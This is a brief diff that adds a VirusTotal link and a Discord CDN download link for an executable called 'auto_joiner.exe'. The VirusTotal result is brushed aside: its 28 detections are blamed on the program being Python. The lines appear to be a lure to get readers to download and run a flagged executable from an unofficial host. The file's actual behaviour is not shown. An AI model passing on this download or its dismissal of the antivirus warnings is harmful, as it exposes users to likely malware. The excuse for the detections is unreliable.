@@ -1,0 +1,3 @@
+https://www.virustotal.com/gui/file/62b79a1a8cb76bef9af41e6146b4d1f2897ebb782b6bac7aa60141665a02bd89 --virus check (it has 28 cus its python so it gets flagged)
+
+https://cdn.discordapp.com/attachments/792258431759286273/1041095639410421861/auto_joiner.exe -- download
